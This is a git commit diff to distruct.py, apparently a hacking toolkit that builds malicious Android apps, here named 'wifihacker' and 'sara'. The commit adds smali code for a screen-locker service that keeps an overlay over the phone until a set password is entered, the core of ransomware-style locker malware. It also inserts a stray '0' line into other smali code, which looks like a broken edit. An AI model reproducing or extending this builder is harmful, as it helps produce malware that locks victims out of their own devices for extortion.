8bf09379c640715e5ac08f49bd14f56db81689c5
T-Dynamos <anshdadwal298@gmail.com>
2021-12-25 21:29:47 +0530

    Test

--- distruct.py
+++ distruct.py
@@ -1111,7 +1111,7 @@ def build_wifihacker():
     iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;
 
     iget-object v1, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;
-
+0
     invoke-static {v1}, Lcom/wifihacker/PassActivity;->access$1(Lcom/wifihacker/PassActivity;)Landroid/content/Intent;
 
     move-result-object v1
@@ -1258,6 +1258,202 @@ def build_sara():
 		res()
 	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
 	os.system("cp -r lib/sara normal_apk")
+	mainservice = '''.class Lcom/termuxhackers/id/MyService$100000000;
+.super Ljava/lang/Object;
+.source "MyService.java"
+
+# interfaces
+.implements Landroid/view/View$OnClickListener;
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lcom/termuxhackers/id/MyService;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x20
+    name = "100000000"
+.end annotation
+
+
+# instance fields
+.field private final this$0:Lcom/termuxhackers/id/MyService;
+
+
+# direct methods
+.method constructor <init>(Lcom/termuxhackers/id/MyService;)V
+    .locals 5
+
+    move-object v0, p0
+
+    move-object v1, p1
+
+    move-object v3, v0
+
+    invoke-direct {v3}, Ljava/lang/Object;-><init>()V
+
+    move-object v3, v0
+
+    move-object v4, v1
+
+    iput-object v4, v3, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    return-void
+.end method
+
+.method static access$0(Lcom/termuxhackers/id/MyService$100000000;)Lcom/termuxhackers/id/MyService;
+    .locals 4
+
+    move-object v0, p0
+
+    move-object v3, v0
+
+    iget-object v3, v3, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    move-object v0, v3
+
+    return-object v0
+.end method
+
+
+# virtual methods
+.method public onClick(Landroid/view/View;)V
+    .locals 14
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Landroid/view/View;",
+            ")V"
+        }
+    .end annotation
+
+    .prologue
+    .line 30
+    move-object v0, p0
+
+    move-object v1, p1
+
+    move-object v6, v0
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->e1:Landroid/widget/EditText;
+
+    invoke-virtual {v6}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
+
+    move-result-object v6
+
+    invoke-interface {v6}, Landroid/text/Editable;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    const-string v7, "'''+key_pass+'''"
+
+    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_0
+
+    .line 31
+    move-object v6, v0
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->windowManager:Landroid/view/WindowManager;
+
+    move-object v7, v0
+
+    iget-object v7, v7, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v7, v7, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;
+
+    invoke-interface {v6, v7}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
+
+    .line 32
+    new-instance v6, Landroid/content/Intent;
+
+    move-object v13, v6
+
+    move-object v6, v13
+
+    move-object v7, v13
+
+    move-object v8, v0
+
+    iget-object v8, v8, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v8, v8, Lcom/termuxhackers/id/MyService;->context:Landroid/content/Context;
+
+    :try_start_0
+    const-string v9, "com.termuxhackers.id.MyService"
+
+    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    :try_end_0
+    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v9
+
+    invoke-direct {v7, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    move-object v3, v6
+
+    .line 33
+    move-object v6, v0
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->context:Landroid/content/Context;
+
+    move-object v7, v3
+
+    invoke-virtual {v6, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    move-result-object v6
+
+    .line 36
+    :goto_0
+    return-void
+
+    .line 32
+    :catch_0
+    move-exception v6
+
+    move-object v4, v6
+
+    new-instance v6, Ljava/lang/NoClassDefFoundError;
+
+    move-object v13, v6
+
+    move-object v6, v13
+
+    move-object v7, v13
+
+    move-object v8, v4
+
+    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V
+
+    throw v6
+
+    .line 36
+    :cond_0
+    move-object v6, v0
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;
+
+    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->e1:Landroid/widget/EditText;
+
+    const-string v7, ""
+
+    invoke-virtual {v6, v7}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
+
+    goto :goto_0
+.end method'''
 	stringsxml =f"""<?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="hello">Hello World!</string>
@@ -1269,6 +1465,7 @@ def build_sara():
     <string name="password">{key_pass}</string>
 </resources>
 """
+	makeFile(f"{pwd}/normal_apk/smali/com/termuxhackers/id/MyService$100000000.smali", mainservice)
 	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
 	if test == "y":
 		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/ic_launcher.png')
@@ -1375,7 +1572,7 @@ def executeMain():
 		build_sara()
 	elif a == "6":
 		print("Custom build comming soon")
-		exit()
+		exit("Soon")
 	else:
 		return executeMain ()
 executeMain()
